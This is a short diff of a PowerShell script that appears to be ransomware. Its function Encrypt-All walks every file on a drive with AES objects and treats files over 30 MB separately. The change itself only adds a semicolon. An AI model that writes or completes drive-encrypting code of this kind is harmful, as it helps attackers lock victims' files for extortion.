@@ -88,7 +88,7 @@ function Too-Big($file, $key){
 function Encrypt-All($key, $drive, $aesManaged, $encryptor){
     $files = Get-Files $drive;
     Foreach ($file in $files){
-        $toobig = ((Get-Item $($file.FullName)).length/1MB) -gt 30
+        $toobig = ((Get-Item $($file.FullName)).length/1MB) -gt 30;
         If ($toobig){
             Too-Big $($file.FullName) $key 
         }
